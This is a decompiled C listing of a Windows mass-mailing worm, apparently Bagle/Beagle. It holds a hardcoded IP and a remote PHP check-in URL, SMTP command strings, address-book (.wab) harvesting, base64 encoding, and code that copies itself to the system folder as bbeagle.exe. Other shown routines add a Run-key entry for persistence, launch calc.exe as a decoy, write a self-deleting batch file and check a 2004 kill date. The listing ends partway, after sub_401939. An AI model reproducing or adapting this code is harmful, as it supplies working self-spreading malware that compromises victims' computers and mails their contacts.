/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_401000(char *a1, unsigned int a2);
int __stdcall sub_401023(_BYTE *a1, int a2);
int __stdcall sub_401043(_BYTE *a1, int a2);
CHAR *__stdcall sub_401063(LPCSTR lpString, PCSTR pszSrch, LPCSTR lpString2);
char __fastcall sub_4010DD(int a1, int a2, _BYTE *a3, int *a4, int a5);
void __fastcall sub_401159(int a1, int a2);
void __noreturn sub_401184();
unsigned __int64 __stdcall sub_40126F(int a1);
int __stdcall sub_4012AA(unsigned int a1);
HRESULT __stdcall sub_4013D2(LPSTREAM *ppstm);
int __stdcall sub_4013E5(int a1);
int __stdcall sub_4013F7(int a1, int a2, int a3);
int __stdcall sub_401426(int a1);
int __stdcall sub_40145B(int a1);
int __stdcall sub_40146E(int a1);
int __stdcall sub_401481(int a1);
unsigned int __stdcall sub_4014F3(LPCSTR lpString);
HGLOBAL __stdcall sub_401524(_DWORD *a1, int a2);
int __stdcall sub_40153E(_DWORD *a1, unsigned int a2, unsigned int a3);
LSTATUS sub_4015A5();
LSTATUS sub_401625();
BOOL sub_401669();
HGLOBAL sub_4016CA();
LSTATUS sub_40179B();
BOOL sub_4017DC();
LSTATUS sub_401835();
unsigned int __stdcall sub_401939(char *cp);
bool __stdcall sub_401972(SOCKET a1, int a2);
BOOL __stdcall sub_4019CF(SOCKET s, int a2, int a3, int a4, int a5);
int __stdcall sub_401A38(SOCKET s, int, int, int, int); // idb
int __stdcall sub_401A9B(SOCKET s, int, int, int); // idb
SOCKET __stdcall sub_401B25(char *cp, int a2, int a3);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
BOOL __stdcall sub_401C78(int a1, int a2, int a3);
HGLOBAL sub_401CBC();
int __stdcall sub_401D2C(int, LPCSTR lpString); // idb
CHAR *__stdcall sub_401E1A(int a1, char *cp);
int __stdcall sub_401F2C(int, int, LPCSTR lpString); // idb
int __stdcall sub_401F81(int, int, PSTR psz); // idb
CHAR *__stdcall sub_401FAF(int a1);
CHAR *__stdcall sub_4020B1(LPCSTR lpString);
int __stdcall sub_4020FB(int a1);
HGLOBAL __stdcall sub_402136(int a1, int a2);
int __stdcall sub_4021C7(int, PCSTR pszStart, char *cp); // idb
const CHAR *__stdcall sub_402465(PCSTR a1, PCSTR pszStart);
LPSTR __stdcall sub_40249F(int a1, int a2, LPCSTR lpString, int a4, int a5);
LPSTR __stdcall sub_4024FC(LPSTR lpString1);
const char *__stdcall sub_4025A5(int a1, PCSTR pszStart, int a3, LPSTR a4);
LPSTREAM __stdcall sub_402601(PCSTR pszStart, int a2);
HGLOBAL sub_402737();
DWORD __stdcall sub_402778(LPVOID lpThreadParameter); // idb
BOOL __stdcall sub_40280C(LPCSTR lpString, PCSTR a2, PCSTR pszSrch);
// _BYTE *__userpurge sub_4028A5@<eax>(_BYTE *a1@<esi>, unsigned int a2);
// char *__userpurge sub_4028F3@<eax>(char *a1@<esi>, unsigned int a2);
BOOL __stdcall sub_40293D(int a1, int a2);
const CHAR *__stdcall sub_40295A(PCSTR pszStart, int a2);
void __stdcall sub_402985(unsigned int a1, int a2, void (__stdcall *a3)(CHAR *));
int __stdcall sub_402A5A(LPCSTR lpFileName, int); // idb
CHAR *sub_402ADD();
int __stdcall sub_402AF6(PCSTR pszFirst); // idb
LPSTR __stdcall sub_402B2C(LPCSTR lpString2);
PSTR __stdcall sub_402B8F(PCSTR pszFirst);
HLOCAL __stdcall sub_402BCB(LPCSTR lpString, int a2);
HGLOBAL __stdcall sub_402C9D(LPCSTR lpString2);
HGLOBAL sub_402CCE();
BOOL sub_402D22();
void *__stdcall sub_402D3D(const char *a1);
void *sub_402DC2();
void __stdcall __noreturn sub_402DED(LPVOID lpThreadParameter);
BOOL sub_402E07();
int __stdcall sub_402E2B(SOCKET s, int); // idb
int __stdcall sub_4030F6(SOCKET s); // idb
void __noreturn start(); // weak
// BOOL __stdcall CloseHandle(HANDLE hObject);
// LONG __stdcall CompareFileTime(const FILETIME *lpFileTime1, const FILETIME *lpFileTime2);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// LPSTR __stdcall GetCommandLineA();
// int __stdcall GetDateFormatA(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpDate, LPCSTR lpFormat, LPSTR lpDateStr, int cchDate);
// UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// DWORD __stdcall GetLogicalDriveStringsA(DWORD nBufferLength, LPSTR lpBuffer);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// DWORD __stdcall GetTickCount();
// int __stdcall GetTimeFormatA(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpTime, LPCSTR lpFormat, LPSTR lpTimeStr, int cchTime);
// DWORD __stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// BOOL __stdcall ReleaseMutex(HANDLE hMutex);
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall SystemTimeToFileTime(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// UINT __stdcall WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// int __stdcall lstrlenA(LPCSTR lpString);
// int wsprintfA(LPSTR, LPCSTR, ...);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// SOCKET __stdcall accept(SOCKET s, struct sockaddr *addr, int *addrlen);
// int __stdcall bind(SOCKET s, const struct sockaddr *name, int namelen);
// int __stdcall closesocket(SOCKET s);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall gethostname(char *name, int namelen);
// unsigned int __stdcall inet_addr(const char *cp);
// int __stdcall listen(SOCKET s, int backlog);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// SOCKET __stdcall socket(int af, int type, int protocol);
// HRESULT __stdcall CoInitialize(LPVOID pvReserved);
// HRESULT __stdcall CreateStreamOnHGlobal(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);
// PSTR __stdcall StrDupA(PCSTR pszSrch);
// PSTR __stdcall StrRChrA(PCSTR pszStart, PCSTR pszEnd, WORD wMatch);
// PSTR __stdcall StrStrIA(PCSTR pszFirst, PCSTR pszSrch);
// BOOL __stdcall StrTrimA(PSTR psz, PCSTR pszTrimChars);
// BOOL __stdcall InternetCloseHandle(HINTERNET hInternet);
// BOOL __stdcall InternetGetConnectedState(LPDWORD lpdwFlags, DWORD dwReserved);
// HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// HINTERNET __stdcall InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// LSTATUS __stdcall RegCreateKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// DWORD __stdcall GetNetworkParams(PFIXED_INFO pFixedInfo, PULONG pOutBufLen);
// HINSTANCE __stdcall ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);

//-------------------------------------------------------------------------
// Data declarations

CHAR a12[3] = "12"; // idb
int dword_405003 = 6777; // weak
CHAR cp[] = "151.201.0.39"; // idb
CHAR aWab[] = ".wab"; // idb
CHAR pszSrch[4] = ".r1"; // idb
char aHttpWwwElrassh[30] = "http://www.elrasshop.de/1.php"; // weak
_UNKNOWN unk_405667; // weak
CHAR Buffer[] = ":l\r\ndel %1\r\nif exist %1 goto l\r\ndel %0"; // idb
CHAR String2[] = "a.bat"; // idb
CHAR Operation[] = "open"; // idb
int dword_4056C5 = 625; // weak
int dword_4056C9 = 69069; // weak
BYTE Data[20] =
{
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u
}; // idb
CHAR CmdLine[] = "calc.exe"; // idb
CHAR SubKey[] = "SOFTWARE\\Windows98"; // idb
CHAR ValueName[] = "uid"; // idb
CHAR aSoftwareMicros[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; // idb
CHAR aD3dupdateExe[] = "d3dupdate.exe"; // idb
CHAR aBbeagleExe[] = "\\bbeagle.exe"; // idb
CHAR aFrun[] = "frun"; // idb
int dword_405754 = 0; // weak
int dword_405758 = 0; // weak
_UNKNOWN unk_40575C; // weak
char byte_405760 = '\0'; // weak
CHAR buf[] = "RSET\r\n"; // idb
CHAR String[] = "DATA\r\n"; // idb
CHAR aRand[] = "[%RAND%]"; // idb
CHAR Format[] = "ddd',' dd MMM yyyy "; // idb
CHAR aHhMmSs[] = "HH:mm:ss "; // idb
char asc_4057E3[4] = "\r\n\\"; // weak
CHAR asc_4057E7[] = "*.*"; // idb
CHAR szAgent[] = "beagle_beagle"; // idb
CHAR aBsupld[] = "\\bsupld"; // idb
CHAR aUpd[] = " -upd"; // idb
CHAR aExe[] = ".exe"; // idb
_DWORD dword_405814[2496] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  
}; // idb
LPCSTR lpString; // idb
int dword_407F18; // weak
HANDLE hHandle; // idb
BYTE NewFileName; // idb
CHAR ExistingFileName[261]; // idb
int dword_40812A; // weak
int dword_40812E; // weak
_DWORD dword_408132[5]; // idb
HANDLE hMutex; // idb
_DWORD dword_40814A; // idb
CHAR byte_40814E; // idb


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(char *a1, unsigned int a2)
{
  char *v2; // edi
  unsigned int v3; // ecx
  int result; // eax

  v2 = a1;
  v3 = a2 >> 2;
  result = 0;
  if ( a2 >> 2 )
  {
    memset(a1, 0, 4 * v3);
    v2 = &a1[4 * v3];
  }
  if ( (a2 & 3) != 0 )
    memset(v2, 0, a2 & 3);
  return result;
}

//----- (00401023) --------------------------------------------------------
int __stdcall sub_401023(_BYTE *a1, int a2)
{
  int result; // eax

  do
  {
    result = sub_4012AA(0x19u) + 97;
    *a1++ = result;
    --a2;
  }
  while ( a2 );
  return result;
}

//----- (00401043) --------------------------------------------------------
int __stdcall sub_401043(_BYTE *a1, int a2)
{
  int result; // eax

  do
  {
    result = sub_4012AA(9u) + 48;
    *a1++ = result;
    --a2;
  }
  while ( a2 );
  return result;
}

//----- (00401063) --------------------------------------------------------
CHAR *__stdcall sub_401063(LPCSTR lpString, PCSTR pszSrch, LPCSTR lpString2)
{
  int v3; // ebx
  int v4; // eax
  PSTR v5; // eax
  const CHAR *v6; // ebx
  CHAR *result; // eax
  CHAR *lpString1; // [esp+4h] [ebp-4h]

  v3 = lstrlenA(lpString);
  v4 = lstrlenA(lpString2);
  lpString1 = (CHAR *)GlobalAlloc(0x40u, v4 + v3 + 16);
  v5 = StrStrIA(lpString, pszSrch);
  if ( v5 )
  {
    *v5 = 0;
    v6 = &v5[lstrlenA(pszSrch)];
    lstrcpyA(lpString1, lpString);
    lstrcatA(lpString1, lpString2);
    lstrcatA(lpString1, v6);
    result = lpString1;
  }
  else
  {
    GlobalFree(lpString1);
    result = 0;
  }
  return result;
}

//----- (004010DD) --------------------------------------------------------
char __fastcall sub_4010DD(int a1, int a2, _BYTE *a3, int *a4, int a5)
{
  int v8; // eax
  unsigned int v9; // ebx
  int v10; // eax
  int v11; // ecx
  unsigned int v12; // eax
  int v13; // ecx
  char result; // al
  int v15; // [esp-4h] [ebp-14h]
  int v16; // [esp+Ch] [ebp-4h]

  v16 = 0;
  v8 = 0;
  do
  {
    v9 = 0;
    LOBYTE(v8) = *a3++;
    v10 = v8 << 8;
    v11 = a5 - 1;
    if ( v11 )
    {
      LOBYTE(v10) = *a3++;
      v12 = v10 << 8;
      if ( --v11 )
      {
        LOBYTE(v12) = *a3++;
        --v11;
      }
      else
      {
        v9 = 1;
      }
    }
    else
    {
      v12 = v10 << 8;
      v9 = 2;
    }
    v15 = v11;
    v13 = 4;
    do
    {
      a2 = __ROL4__(a2, 8);
      LOBYTE(a2) = v12 & 0x3F;
      v12 >>= 6;
      --v13;
    }
    while ( v13 );
    sub_401159(4, a2);
    *a4++ = a2;
    if ( ++v16 == 18 )
    {
      v16 = 0;
      *(_WORD *)a4 = 2573;
      a4 = (int *)((char *)a4 + 2);
    }
    a5 = v15;
  }
  while ( v15 );
  result = 61;
  memset((char *)a4 - v9, 61, v9);
  return result;
}
// 4010FB: variable 'v8' is possibly undefined
// 401117: variable 'a2' is possibly undefined

//----- (00401159) --------------------------------------------------------
void __fastcall sub_401159(int a1, int a2)
{
  do
  {
    if ( (unsigned __int8)a2 >= 0x3Eu )
    {
      LOBYTE(a2) = 4 * (a2 - 62) + 43;
    }
    else if ( (unsigned __int8)a2 > 0x33u )
    {
      LOBYTE(a2) = a2 - 4;
    }
    else
    {
      LOBYTE(a2) = a2 + 65;
      if ( (unsigned __int8)a2 > 0x5Au )
        LOBYTE(a2) = a2 + 6;
    }
    a2 = __ROL4__(a2, 8);
    --a1;
  }
  while ( a1 );
}

//----- (00401184) --------------------------------------------------------
void __noreturn sub_401184()
{
  PSTR v0; // eax
  int v1; // eax
  CHAR *v2; // [esp+0h] [ebp-14h]
  CHAR *lpString1; // [esp+4h] [ebp-10h]
  CHAR *lpFilename; // [esp+8h] [ebp-Ch]
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-8h] BYREF
  HANDLE hFile; // [esp+10h] [ebp-4h]

  lpFilename = (CHAR *)GlobalAlloc(0x40u, 0x400u);
  lpString1 = (CHAR *)GlobalAlloc(0x40u, 0x400u);
  v2 = (CHAR *)GlobalAlloc(0x40u, 0x400u);
  GetModuleFileNameA(0, lpFilename, 0x104u);
  lstrcpyA(lpString1, lpFilename);
  v0 = StrRChrA(lpString1, 0, 0x5Cu);
  if ( v0 )
  {
    lstrcpyA(v0 + 1, String2);
    hFile = CreateFileA(lpString1, 0xC0000000, 3u, 0, 2u, 0, 0);
    if ( hFile != (HANDLE)-1 )
    {
      v1 = lstrlenA(Buffer);
      WriteFile(hFile, Buffer, v1, &NumberOfBytesWritten, 0);
      CloseHandle(hFile);
      wsprintfA(v2, "\"%s\"", lpFilename);
      ShellExecuteA(0, Operation, lpString1, v2, 0, 0);
    }
  }
  ExitProcess(0);
}

//----- (0040126F) --------------------------------------------------------
unsigned __int64 __stdcall sub_40126F(int a1)
{
  _DWORD *v1; // edi
  unsigned __int64 result; // rax

  v1 = dword_405814;
  LODWORD(result) = a1;
  dword_405814[0] = a1;
  dword_4056C5 = 1;
  do
  {
    ++v1;
    result = (unsigned int)dword_4056C9 * (unsigned __int64)(unsigned int)result;
    *v1 = result;
    ++dword_4056C5;
  }
  while ( dword_4056C5 != 624 );
  return result;
}
// 4056C5: using guessed type int dword_4056C5;
// 4056C9: using guessed type int dword_4056C9;

//----- (004012AA) --------------------------------------------------------
int __stdcall sub_4012AA(unsigned int a1)
{
  unsigned int *v1; // esi
  unsigned int v2; // eax
  unsigned int v3; // eax
  char v4; // cl
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // esi
  int v9; // [esp+Ch] [ebp-4h]

  if ( (unsigned int)dword_4056C5 >= 0x270 )
  {
    if ( dword_4056C5 == 625 )
      sub_40126F(4357);
    v9 = 0;
    v1 = dword_405814;
    do
    {
      v2 = v1[397] ^ ((v1[1] & 0x7FFFFFFF | *v1 & 0x80000000) >> 1);
      if ( (v1[1] & 1) != 0 )
        v2 ^= 0x9908B0DF;
      *v1++ = v2;
      ++v9;
    }
    while ( v9 != 227 );
    do
    {
      v3 = *(v1 - 227) ^ ((v1[1] & 0x7FFFFFFF | *v1 & 0x80000000) >> 1);
      v4 = v1[1] & 1;
      if ( v4 )
        v3 ^= 0x9908B0DF;
      *v1++ = v3;
      ++v9;
    }
    while ( v9 != 623 );
    v5 = dword_405814[396] ^ v3;
    if ( (v4 & 1) != 0 )
      v5 ^= 0x9908B0DF;
    *v1 = v5;
    dword_4056C5 = 0;
  }
  v6 = dword_4056C5++;
  v7 = &dword_405814[v6];
  return ((((((*v7 >> 11) ^ *v7) << 7) & 0x9D2C5680 ^ (*v7 >> 11) ^ *v7) << 15) & 0xEFC60000 ^ (((*v7 >> 11) ^ *v7) << 7) & 0x9D2C5680 ^ (*v7 >> 11) ^ *v7 ^ (unsigned __int64)(((((((*v7 >> 11) ^ *v7) << 7) & 0x9D2C5680 ^ (*v7 >> 11) ^ *v7) << 15) & 0xEFC60000 ^ (((*v7 >> 11) ^ *v7) << 7) & 0x9D2C5680 ^ (*v7 >> 11) ^ *v7) >> 18))
       % a1;
}
// 4056C5: using guessed type int dword_4056C5;

//----- (004013D2) --------------------------------------------------------
HRESULT __stdcall sub_4013D2(LPSTREAM *ppstm)
{
  return CreateStreamOnHGlobal(0, 1, ppstm);
}

//----- (004013E5) --------------------------------------------------------
int __stdcall sub_4013E5(int a1)
{
  return (*(int (__stdcall **)(int))(*(_DWORD *)a1 + 8))(a1);
}

//----- (004013F7) --------------------------------------------------------
int __stdcall sub_4013F7(int a1, int a2, int a3)
{
  return (*(int (__stdcall **)(int, int, _DWORD, int, _DWORD))(*(_DWORD *)a1 + 20))(a1, a2, 0, a3, 0);
}

//----- (00401426) --------------------------------------------------------
int __stdcall sub_401426(int a1)
{
  int v2[2]; // [esp+4h] [ebp-8h] BYREF

  v2[0] = 0;
  v2[1] = 0;
  (*(void (__stdcall **)(int, _DWORD, _DWORD, int, int *))(*(_DWORD *)a1 + 20))(a1, 0, 0, 2, v2);
  return v2[0];
}

//----- (0040145B) --------------------------------------------------------
int __stdcall sub_40145B(int a1)
{
  return sub_4013F7(a1, 0, 2);
}

//----- (0040146E) --------------------------------------------------------
int __stdcall sub_40146E(int a1)
{
  return sub_4013F7(a1, 0, 0);
}

//----- (00401481) --------------------------------------------------------
int __stdcall sub_401481(int a1)
{
  sub_40146E(a1);
  return (*(int (__stdcall **)(int, _DWORD, _DWORD))(*(_DWORD *)a1 + 24))(a1, 0, 0);
}

//----- (004014F3) --------------------------------------------------------
unsigned int __stdcall sub_4014F3(LPCSTR lpString)
{
  int v1; // ecx
  unsigned int v2; // edx
  LPCSTR v3; // eax
  int v4; // ebx

  v1 = lstrlenA(lpString);
  v2 = -236792892;
  if ( v1 )
  {
    v3 = lpString;
    do
    {
      v4 = *(unsigned __int8 *)v3++;
      v2 = v4 + ((v2 >> 27) | (32 * v2));
      --v1;
    }
    while ( v1 );
  }
  return v2;
}

//----- (00401524) --------------------------------------------------------
HGLOBAL __stdcall sub_401524(_DWORD *a1, int a2)
{
  HGLOBAL result; // eax

  result = GlobalAlloc(0x40u, 4 * a2);
  *a1 = result;
  return result;
}

//----- (0040153E) --------------------------------------------------------
int __stdcall sub_40153E(_DWORD *a1, unsigned int a2, unsigned int a3)
{
  int v3; // edx
  _DWORD **v4; // eax
  _DWORD *v5; // eax
  int result; // eax
  _DWORD *i; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // [esp-4h] [ebp-4h]
  int v10; // [esp-4h] [ebp-4h]

  v3 = 4 * (a3 % a2);
  v4 = (_DWORD **)(v3 + *a1);
  if ( *v4 )
  {
    for ( i = *v4; i; i = (_DWORD *)i[1] )
    {
      v3 = (int)i;
      if ( *i == a3 )
        return 0;
    }
    v10 = v3;
    v8 = GlobalAlloc(0x40u, 8u);
    *(_DWORD *)(v10 + 4) = v8;
    *v8 = a3;
    result = 1;
  }
  else
  {
    v9 = (_DWORD *)(v3 + *a1);
    v5 = GlobalAlloc(0x40u, 8u);
    *v9 = v5;
    *v5 = a3;
    result = 1;
  }
  return result;
}

//----- (004015A5) --------------------------------------------------------
LSTATUS sub_4015A5()
{
  BYTE *v0; // edi
  int v1; // esi
  DWORD cbData; // [esp+8h] [ebp-Ch] BYREF
  DWORD Type; // [esp+Ch] [ebp-8h] BYREF
  HKEY phkResult; // [esp+10h] [ebp-4h] BYREF

  RegCreateKeyA(HKEY_CURRENT_USER, SubKey, &phkResult);
  cbData = 9;
  if ( RegQueryValueExA(phkResult, ValueName, 0, &Type, Data, &cbData) )
  {
    v0 = Data;
    v1 = 9;
    do
    {
      *v0++ = sub_4012AA(9u) + 49;
      --v1;
    }
    while ( v1 );
    RegSetValueExA(phkResult, ValueName, 0, 1u, Data, 8u);
  }
  return RegCloseKey(phkResult);
}

//----- (00401625) --------------------------------------------------------
LSTATUS sub_401625()
{
  int v0; // eax
  HKEY phkResult; // [esp+0h] [ebp-4h] BYREF

  RegCreateKeyA(HKEY_CURRENT_USER, aSoftwareMicros, &phkResult);
  v0 = lstrlenA((LPCSTR)&NewFileName);
  RegSetValueExA(phkResult, aD3dupdateExe, 0, 1u, &NewFileName, v0);
  return RegCloseKey(phkResult);
}

//----- (00401669) --------------------------------------------------------
BOOL sub_401669()
{
  FILETIME FileTime2; // [esp+0h] [ebp-30h] BYREF
  struct _FILETIME FileTime; // [esp+8h] [ebp-28h] BYREF
  SYSTEMTIME v3; // [esp+10h] [ebp-20h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+20h] [ebp-10h] BYREF

  GetLocalTime(&SystemTime);
  sub_401000((char *)&v3, 0x10u);
  v3.wYear = 2004;
  v3.wMonth = 1;
  v3.wDay = 28;
  SystemTimeToFileTime(&SystemTime, &FileTime);
  SystemTimeToFileTime(&v3, &FileTime2);
  return CompareFileTime(&FileTime, &FileTime2) != 1;
}

//----- (004016CA) --------------------------------------------------------
HGLOBAL sub_4016CA()
{
  HANDLE v0; // eax
  void *v1; // ebx
  const void *v2; // eax
  int v3; // ecx
  _BYTE *v5; // [esp-8h] [ebp-14h]
  const void *v6; // [esp-4h] [ebp-10h]
  CHAR *lpFilename; // [esp+0h] [ebp-Ch]
  int v8; // [esp+4h] [ebp-8h]
  HANDLE hFile; // [esp+8h] [ebp-4h]

  lpFilename = (CHAR *)GlobalAlloc(0x40u, 0x2000u);
  GetModuleFileNameA(0, lpFilename, 0x1FFFu);
  hFile = CreateFileA(lpFilename, 0x80000000, 1u, 0, 3u, 0, 0);
  if ( hFile != (HANDLE)-1 )
  {
    v8 = GetFileSize(hFile, 0);
    if ( v8 != -1 )
    {
      v0 = CreateFileMappingA(hFile, 0, 2u, 0, 0, 0);
      if ( v0 )
      {
        v1 = v0;
        v2 = MapViewOfFile(v0, 4u, 0, 0, 0);
        if ( v2 )
        {
          v6 = v2;
          v5 = v2;
          lpString = (LPCSTR)GlobalAlloc(0x40u, 4 * v8);
          sub_4010DD(v3, (int)v5, v5, (int *)lpString, v8);
          dword_407F18 = lstrlenA(lpString);
          UnmapViewOfFile(v6);
        }
        CloseHandle(v1);
      }
    }
    CloseHandle(hFile);
  }
  return GlobalFree(lpFilename);
}
// 401769: variable 'v3' is possibly undefined
// 407F18: using guessed type int dword_407F18;

//----- (0040179B) --------------------------------------------------------
LSTATUS sub_40179B()
{
  BYTE Data[4]; // [esp+0h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+4h] [ebp-4h] BYREF

  RegCreateKeyA(HKEY_CURRENT_USER, SubKey, &phkResult);
  *(_DWORD *)Data = 1;
  RegSetValueExA(phkResult, aFrun, 0, 4u, Data, 4u);
  return RegCloseKey(phkResult);
}

//----- (004017DC) --------------------------------------------------------
BOOL sub_4017DC()
{
  BOOL v0; // ebx
  BYTE Data[4]; // [esp+4h] [ebp-10h] BYREF
  DWORD cbData; // [esp+8h] [ebp-Ch] BYREF
  DWORD Type; // [esp+Ch] [ebp-8h] BYREF
  HKEY phkResult; // [esp+10h] [ebp-4h] BYREF

  RegCreateKeyA(HKEY_CURRENT_USER, SubKey, &phkResult);
  cbData = 4;
  v0 = RegQueryValueExA(phkResult, aFrun, 0, &Type, Data, &cbData) != 0;
  RegCloseKey(phkResult);
  return v0;
}

//----- (00401835) --------------------------------------------------------
LSTATUS sub_401835()
{
  int v0; // eax
  LPSTR v1; // eax
  struct WSAData WSAData; // [esp+2h] [ebp-18Eh] BYREF

  if ( !sub_401669() )
    ExitProcess(0);
  v0 = GetTickCount();
  sub_40126F(v0);
  sub_4015A5();
  WSAStartup(0x101u, &WSAData);
  sub_402ADD();
  hHandle = CreateMutexA(0, 0, 0);
  sub_402737();
  sub_4016CA();
  GetSystemDirectoryA((LPSTR)&NewFileName, 0x104u);
  GetModuleFileNameA(0, ExistingFileName, 0x104u);
  lstrcatA((LPSTR)&NewFileName, aBbeagleExe);
  sub_401625();
  if ( !StrStrIA(ExistingFileName, (PCSTR)&NewFileName) )
  {
    v1 = GetCommandLineA();
    do
    {
      if ( *(_DWORD *)v1 == 1685091629 )
        goto LABEL_8;
      ++v1;
    }
    while ( v1[3] );
    WinExec(CmdLine, 5u);
LABEL_8:
    if ( CopyFileA(ExistingFileName, (LPCSTR)&NewFileName, 0) )
      WinExec((LPCSTR)&NewFileName, 0);
    ExitProcess(0);
  }
  if ( sub_4017DC() )
    dword_405754 = 1;
  return sub_40179B();
}
// 405754: using guessed type int dword_405754;

//----- (00401939) --------------------------------------------------------
unsigned int __stdcall sub_401939(char *cp)
{
  unsigned int result; // eax
  struct hostent *v2; // eax
  int **v3; // eax

  result = inet_addr(cp);
  if ( result == -1 )
  {
    v2 = gethostbyname(cp);
    if ( v2 )
    {
      v3 = (int **)v2->h_addr_list;
      if ( v3 )
        result = **v3;
      else
        result = -1;
    }
    else
    {
      result = -1;
    }
  }
  return result;
